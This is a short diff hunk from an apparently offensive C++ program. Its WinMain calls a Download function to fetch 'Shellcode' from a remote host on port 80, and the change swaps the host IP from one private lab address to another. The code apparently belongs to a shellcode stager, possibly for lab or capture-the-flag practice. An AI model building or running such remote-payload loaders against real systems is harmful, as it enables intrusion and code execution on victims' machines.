@@ -91,7 +91,7 @@ Shellcode Download(LPCWSTR host, INTERNET_PORT port) {
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     
-	Shellcode shellcode = Download(L"10.10.14.3", 80);
+	Shellcode shellcode = Download(L"10.8.0.123", 80);
 
 	size_t sShellcode = shellcode.len;
 
